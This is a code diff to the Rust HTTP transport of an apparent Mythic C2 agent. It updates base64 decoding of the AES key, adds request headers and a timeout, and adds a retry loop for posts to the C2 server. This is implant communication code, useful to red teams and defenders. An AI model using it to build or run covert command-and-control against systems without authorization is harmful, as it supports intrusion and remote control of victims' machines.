@@ -1,4 +1,5 @@
 use crate::profiles::C2Profile;
+use base64::{Engine as _, engine::general_purpose};
 use std::error::Error;
 
 /// Struct holding information for the HTTP profile
@@ -12,7 +13,7 @@ impl HTTPProfile {
     /// * `host` - Host for the C2 connection
     pub fn new(host: &str) -> Self {
         // base64 decode the aes key
-        let aes_key = profilevars::aes_key().map(|k| base64::decode(k).unwrap());
+        let aes_key = profilevars::aes_key().map(|k| general_purpose::STANDARD.decode(k).unwrap());
 
         Self {
             aes_key,
@@ -52,9 +53,12 @@ impl C2Profile for HTTPProfile {
 /// * `url` - URL for the post request
 /// * `body` - Body of the post request
 fn http_post(url: &str, body: &str) -> Result<String, Box<dyn Error>> {
-    // Create a new post request with the configured user agent
+    // Create a new post request with the configured user agent and timeout
     let mut req = minreq::post(url)
         .with_header("User-Agent", profilevars::useragent())
+        .with_header("Content-Type", "application/json")
+        .with_header("Connection", "keep-alive")
+        .with_timeout(30) // 30 second timeout
         .with_body(body);
 
     // Add any additional headers
@@ -64,19 +68,63 @@ fn http_post(url: &str, body: &str) -> Result<String, Box<dyn Error>> {
         }
     }
 
-    // Send the post request
-    let res = req.send()?;
+    // Send the post request with retry logic
+    let mut attempts = 0;
+    let max_attempts = 3;
+    
+    loop {
+        attempts += 1;
+        
+        let res = match req.clone().send() {
+            Ok(response) => response,
+            Err(e) => {
+                if attempts >= max_attempts {
+                    return Err(std::io::Error::new(
+                        std::io::ErrorKind::ConnectionRefused,
+                        format!("Failed to make post request to {} after {} attempts: {}. Please check if the Mythic server is running and the URL is correct.", url, max_attempts, e),
+                    )
+                    .into());
+                }
+                
+                // Wait before retrying
+                std::thread::sleep(std::time::Duration::from_secs(2));
+                continue;
+            }
+        };
 
-    // Check the status code
-    if res.status_code != 200 {
-        return Err(std::io::Error::new(
-            std::io::ErrorKind::ConnectionRefused,
-            "Failed to make post request",
-        )
-        .into());
+        // Check the status code
+        if res.status_code != 200 {
+            if attempts >= max_attempts {
+                return Err(std::io::Error::new(
+                    std::io::ErrorKind::ConnectionRefused,
+                    format!("Failed to make post request to {}: HTTP {} - {}", url, res.status_code, res.reason_phrase),
+                )
+                .into());
+            }
+            
+            std::thread::sleep(std::time::Duration::from_secs(2));
+            continue;
+        }
+
+        // Try to get the response body
+        match res.as_str() {
+            Ok(response_body) => {
+                return Ok(response_body.to_string());
+            },
+            Err(e) => {
+                if attempts >= max_attempts {
+                    return Err(std::io::Error::new(
+                        std::io::ErrorKind::InvalidData,
+                        format!("Failed to read response body from {}: {}", url, e),
+                    )
+                    .into());
+                }
+                
+                std::thread::sleep(std::time::Duration::from_secs(2));
+                continue;
+            }
+        }
     }
-
-    Ok(res.as_str()?.to_string())
 }
 
 /// Configuration variables specific to the HTTP C2 profile
